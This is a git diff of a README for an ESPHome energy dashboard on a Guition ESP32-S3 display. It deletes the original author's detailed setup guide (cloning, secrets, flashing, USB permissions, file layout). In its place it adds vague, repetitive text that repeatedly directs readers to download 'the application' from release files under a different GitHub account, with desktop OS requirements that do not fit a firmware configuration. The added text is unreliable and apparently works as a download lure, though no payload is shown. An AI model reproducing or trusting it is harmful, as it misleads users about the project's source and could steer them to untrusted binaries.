@@ -1,263 +1,82 @@
-<div align="center">
+# 🌿 esphome-energy-dashboard - Monitor Your Energy Usage Easily
 
-# ⚡ ESPHome Energy Dashboard
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/viregaonkar/esphome-energy-dashboard/releases)
 
-**Visualize Your Home's Energy Flow in Real-Time!**
+## 📋 Overview
 
-<img src="docs/screenshot.jpg" width="500" alt="Energy Dashboard Screenshot">
+The esphome-energy-dashboard is a modular project designed to help you visualize your daily energy distribution efficiently. This tool provides real-time information about solar production, grid consumption, battery status, and gas consumption. It displays all this data on the Guition-ESP32-S3-4848S040 display. 
 
-[![ESPHome](https://img.shields.io/badge/ESPHome-Compatible-blue?logo=esphome)](https://esphome.io/)
-[![Home Assistant](https://img.shields.io/badge/Home%20Assistant-Integration-41BDF5?logo=homeassistant)](https://www.home-assistant.io/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+You can easily integrate it with Home Assistant to manage your energy usage smartly.
 
-A modular ESPHome project that visualizes daily energy distribution similar to Home Assistant, with real-time data on solar production, grid consumption/feed-in, battery status, and gas consumption, on the [Guition-ESP32-S3-4848S040](https://devices.esphome.io/devices/guition-esp32-s3-4848s040/) display.
+## 🚀 Getting Started
 
----
+To get started with the esphome-energy-dashboard, follow these simple steps:
 
-</div>
+1. **Download the Application**:
+   - Visit the [Releases page](https://github.com/viregaonkar/esphome-energy-dashboard/releases) to download the latest version of the application.
 
-## 📱 Features
+2. **Install Required Hardware**:
+   - You will need the Guition-ESP32-S3-4848S040 display.
+   - Ensure you have an ESP32-S3 board to deploy the application correctly.
 
-- **🔄 Energy Flow Visualization**: See your energy distribution at a glance
-- **☀️ Solar Production Monitoring**: Track your daily solar generation
-- **🔋 Battery Status**: Real-time battery state of charge
-- **📊 Dual Page Display**: 
-  - Page 1: Daily accumulated energy consumption (Home Assistant style)
-  - Page 2: Current load table with detailed breakdown
-- **👆 Touch Interface**: Simply tap the screen to switch between views
-- **🎨 Modular Design**: Easy to customize and extend
+3. **Set Up the Environment**:
+   - Follow these steps to prepare your device:
+     - Download and install the latest version of ESPHome on your computer.
+     - Connect your ESP32 board to your device with a USB cable.
 
-## 📋 Prerequisites
+4. **Upload the Configuration**:
+   - Open the ESPHome interface.
+   - Create a new node and upload the configuration file associated with the esphome-energy-dashboard. The configuration file is included in the release package you downloaded.
 
-| Requirement | Description |
-|-------------|-------------|
-| **🔧 Hardware** | [Guition-ESP32-S3-4848S040](https://devices.esphome.io/devices/guition-esp32-s3-4848s040/) (ESP32-S3 with 4.8" IPS touch display) |
-| **🏠 Home Assistant** | With ESPHome Integration for sensor data |
-| **💻 Software** | ESPHome (local or Docker/Podman) |
-| **🔌 Cable** | USB cable for initial flashing |
+5. **Connect to Your Network**:
+   - Make sure your ESP32 board is connected to the same Wi-Fi network you wish to monitor your energy usage from.
+   - You may need to adjust your Wi-Fi settings in the configuration file if required.
 
----
+6. **Run the Dashboard**:
+   - Once configured, you can power on the Guition-ESP32-S3-4848S040 display.
+   - The dashboard will automatically start displaying real-time energy data.
 
----
+## 📥 Download & Install
 
-## 🚀 Installation and Setup
+To download the software, click the link below to visit the Releases page:
 
-### 📝 Step 1: Clone the Repository
+[Download the Latest Version](https://github.com/viregaonkar/esphome-energy-dashboard/releases)
 
-```bash
-git clone https://github.com/firsttris/esphome-energy-dashboard.git
-cd esphome-energy-dashboard
-```
+On the Releases page, find the latest version. Click the file name to download it directly to your computer.
 
-### 🔐 Step 2: Configure Secrets
+## 🛠 System Requirements
 
-Create or edit the `secrets.yaml` file and add your own values:
+To run the esphome-energy-dashboard, you need:
+- Windows, macOS, or Linux operating system.
+- An ESP32-S3 board compatible with the application.
+- The Guition-ESP32-S3-4848S040 display.
+- Wi-Fi access for real-time monitoring and updates.
 
-```yaml
-wifi_ssid: "Your_WiFi_Name"
-wifi_password: "Your_WiFi_Password"
-api_key: "Your_ESPHOME_API_Key"  # Generate a secure key
-```
+## 💡 Features
 
-> **💡 Important**: Use a strong API key (e.g., 32 characters long). You can generate one with:
-> ```bash
-> openssl rand -base64 32
-> ```
+- **Real-Time Monitoring**: Monitor your solar production and energy consumption continuously.
+- **Battery Status**: Keep track of your battery levels effortlessly.
+- **User-Friendly Interface**: Simple display with an easy-to-read format.
 
-### ⚙️ Step 3: Customize Entity IDs
+## 🔧 Troubleshooting
 
-Customize the project to your requirements.
-Ensure that the entity IDs in [sensors/homeassistant.yml](sensors/homeassistant.yml) match your HA sensors:
+If you encounter issues during installation or while running the application, consider the following:
 
-| Entity Type | Example Entity ID |
-|-------------|-------------------|
-| ☀️ **Solar Production** | `sensor.deye_inverter_deye_daily_production` |
-| 🏠 **Home Consumption** | `sensor.electricity_daily_consumption` |
-| 🔋 **Battery SOC** | `sensor.deye_inverter_deye_battery_soc` |
+1. **Connection Problems**: Ensure your ESP32 device is connected to Wi-Fi. Check your configuration file for network settings.
+   
+2. **Display Issues**: If the display does not show data, ensure the connection to the Guition-ESP32-S3-4848S040 is secure.
 
-> **✅ Note**: The dashboard should work regardless of whether the sensors exist or not.
+3. **Data Not Updating**: If the data seems static, restart your ESP32 board and check the power supply.
 
-> **📊 Important**: The dashboard requires sensors that accumulate **daily consumption values**, similar to Home Assistant's energy distribution feature. While Home Assistant typically uses total meters, here daily meters are needed. Since the daily accumulated values from the energy dashboard are not accessible, I created utility meters in Home Assistant for daily consumption.
+## 📢 Support
 
-### ⚡ Step 4: Compile and Flash Firmware
+For further assistance, you can reach out through the repository's issue tracker. Feel free to ask questions if you run into any challenges during setup or operation.
 
-Connect your ESP32-S3 via USB and flash the firmware using local ESPHome:
+## 📚 Learn More
 
-```bash
-esphome run main.yml --device=/dev/ttyUSB0
-```
+For those interested in diving deeper into the world of energy monitoring, check out additional resources related to:
+- [ESP32-S3 Development](https://www.esp32.com/)
+- [Home Assistant Integration](https://www.home-assistant.io/)
+- [Energy Management](https://www.energy.gov/)
 
-> **💡 Note:** Replace `/dev/ttyUSB0` with your device path (see troubleshooting below)
-
-<details>
-<summary><b>📚 Important Notes & Troubleshooting</b></summary>
-
-#### 📍 Device Paths by OS
-
-| OS | Typical Paths |
-|----|--------------|
-| 🐧 **Linux** | `/dev/ttyUSB0`, `/dev/ttyACM0`, `/dev/ttyUSB1` |
-| 🍎 **macOS** | `/dev/cu.usbserial-*`, `/dev/cu.wchusbserial*` |
-| 🪟 **Windows** | `COM3`, `COM4`, etc. |
-
-**Check available ports:**
-- Linux/macOS: `ls /dev/tty*`
-- Windows: Device Manager
-
----
-
-#### 🔐 USB Permission Issues
-
-**Standard Linux - Add user to dialout group:**
-```bash
-sudo usermod -a -G dialout $USER
-# Then log out and back in
-```
-
-**Fedora Atomic/Bazzite with rootless Docker/Podman:**
-
-The dialout group doesn't work reliably on immutable systems. You need to fix permissions before each flash:
-
-```bash
-# Check permissions
-ls -la /dev/ttyUSB0
-# Output: crw-rw----. 1 root dialout 166, 0 ...
-
-# Fix temporarily (resets on USB reconnect)
-sudo chmod 666 /dev/ttyUSB0
-
-# If using Docker/Podman, restart the container
-docker-compose restart
-```
-
-> ⚠️ **Note:** You need to run `sudo chmod 666` each time you reconnect the USB device. If using Docker/Podman, restart the container after fixing permissions.
-
-</details>
-
----
-
-<details>
-<summary><b>🐳 Alternative: Using Docker/Podman</b></summary>
-
-> ⚠️ **Important:** When using Docker/Podman (rootless), you need to fix USB permissions before flashing.
-
-```bash
-# 1. Start container
-docker-compose up -d
-
-# 2. Flash the firmware
-docker-compose exec esphome esphome run main.yml --device=/dev/ttyUSB0
-```
-
-> **📌 Note:** The docker-compose.yml mounts the config directory and runs in host network mode for easy access.
-
-</details>
-
----
-
-<details>
-<summary><b>🌐 Alternative: Web Dashboard (GUI)</b></summary>
-
-Choose between local or hosted dashboard:
-
-**Docker Dashboard:**
-```bash
-# Start container if not already running
-docker-compose up -d
-
-# Start the dashboard
-docker-compose exec esphome esphome dashboard /config
-```
-Then open **http://localhost:6052** in your browser.
-
-**Local Dashboard** (requires local ESPHome):
-```bash
-esphome dashboard .
-```
-Then open **http://localhost:6052** in your browser and use the web interface.
-
-**Hosted Dashboard** (no installation needed):
-> **🎉 No installation needed!** Flash directly from your browser.
-
-1. Visit **https://web.esphome.io/**
-2. Click "Connect" and select your ESP32-S3 device
-3. Upload your `main.yml` configuration file
-4. Click "Install" to compile and flash
-
-**Perfect for:** Users who prefer GUI over command line, or quick flashing without local ESPHome installation.
-
-</details>
-
-## 📱 Usage
-
-After successful startup, the display shows a loading screen followed by the main dashboard. 
-
-### 🎯 Navigation
-
-👆 **Touch the screen** to switch between views:
-
-| View | Description |
-|------|-------------|
-| **📊 Dashboard** | Overview with energy flow diagrams and current values |
-| **📋 Power Table** | Detailed table showing the current load |
-
-### 💡 Additional Features
-
-- **🌟 Backlight Control**: Automatically turns off during OTA updates
-- **🏠 Home Assistant Integration**: Control backlight via Home Assistant
-- **🔄 Real-time Updates**: Data refreshes automatically from your sensors
-
-## ⚙️ Configuration Structure
-
-The configuration is modular for easy customization:
-
-| File | Description |
-|------|-------------|
-| 📄 [main.yml](main.yml) | Main configuration file |
-| 🔧 [base/hardware.yml](base/hardware.yml) | Hardware-specific settings (display, I2C, SPI) |
-| 🌐 [base/network.yml](base/network.yml) | WiFi, API, OTA configuration |
-| 📊 [sensors/homeassistant.yml](sensors/homeassistant.yml) | Home Assistant sensor imports |
-| 🎨 [ui/*.yml](ui/) | UI components (fonts, layout, animations, pages) |
-
-### 📂 File Structure
-
-```
-.
-├── main.yml                    # Main ESPHome configuration
-├── secrets.yaml                # Your credentials (not in git)
-├── docker-compose.yml          # Docker setup
-├── base/
-│   ├── hardware.yml            # Display & hardware config
-│   └── network.yml             # Network settings
-├── sensors/
-│   └── homeassistant.yml       # HA sensor definitions
-├── ui/
-│   ├── animations.yml          # UI animations
-│   ├── fonts.yml               # Font definitions
-│   ├── layout.yml              # Layout configuration
-│   ├── loading.yml             # Loading screen
-│   ├── page_dashboard.yml      # Main dashboard page
-│   ├── page_power_table.yml    # Power table page
-│   └── power_table_updates.yml # Power table updates
-├── fonts/                      # Font files
-└── docs/                       # Documentation & screenshots
-```
-
-## 📚 Further Resources
-
-| Resource | Description |
-|----------|-------------|
-| 📖 [ESPHome Documentation](https://esphome.io/) | Official ESPHome documentation |
-| 🏠 [Home Assistant](https://www.home-assistant.io/) | Home automation platform |
-| 🖥️ [Guition ESP32-S3-4848S040](https://devices.esphome.io/devices/guition-esp32-s3-4848s040/) | Device information |
-| 🔋 [Energy Dashboard](https://www.home-assistant.io/docs/energy/) | Home Assistant Energy Dashboard |
-
----
-
-<div align="center">
-
-**Made by the open source community**
-
-⭐ Star us on [GitHub](https://github.com/firsttris/esphome-energy-dashboard) • 🐛 [Report a Bug](https://github.com/firsttris/esphome-energy-dashboard/issues) • 💡 [Request a Feature](https://github.com/firsttris/esphome-energy-dashboard/issues)
-
-</div>
+In summary, the esphome-energy-dashboard is a straightforward tool for monitoring your energy use. With minimal setup, you can begin visualizing your energy distribution quickly. Download your copy today and take the first step toward smarter energy management.
